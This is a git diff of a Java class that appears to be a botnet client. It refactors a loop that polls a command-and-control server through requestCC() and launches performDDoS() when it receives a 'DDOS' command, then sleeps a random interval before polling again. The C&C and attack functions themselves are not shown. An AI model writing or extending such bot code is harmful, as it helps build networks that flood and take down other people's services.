@@ -143,33 +143,28 @@ public class Main {
 
 			Random random = new Random();
 			
-			// "listen" for a command
-			Thread thread = new Thread() {
-				public void run() {
-					while (true) {
-						try {
-							Main.requestCC();
+			// "listen" for command
+			while (true) {
+				try {
+					Main.requestCC();
 
-							switch (COMMAND) {
+					switch (COMMAND) {
 
-							case "DDOS":
-								performDDoS();
-								break;
+					case "DDOS":
+						performDDoS();
+						break;
 
-							default:
-								// just idle around
-								break;
-							}
-							int randomInt = random.nextInt(45);
-							System.out.println("Sleeping "+randomInt+" seconds");
-							Thread.sleep(randomInt*1000);
-						} catch (Exception e) {
-							e.printStackTrace();
-						}
+					default:
+						// just idle around
+						break;
 					}
+					int randomInt = random.nextInt(45);
+					System.out.println("Sleeping "+randomInt+" seconds");
+					Thread.sleep(randomInt*1000);
+				} catch (Exception e) {
+					e.printStackTrace();
 				}
-			};
-			thread.start();
+			}
 
 		} catch (Exception e) {
 			e.printStackTrace();
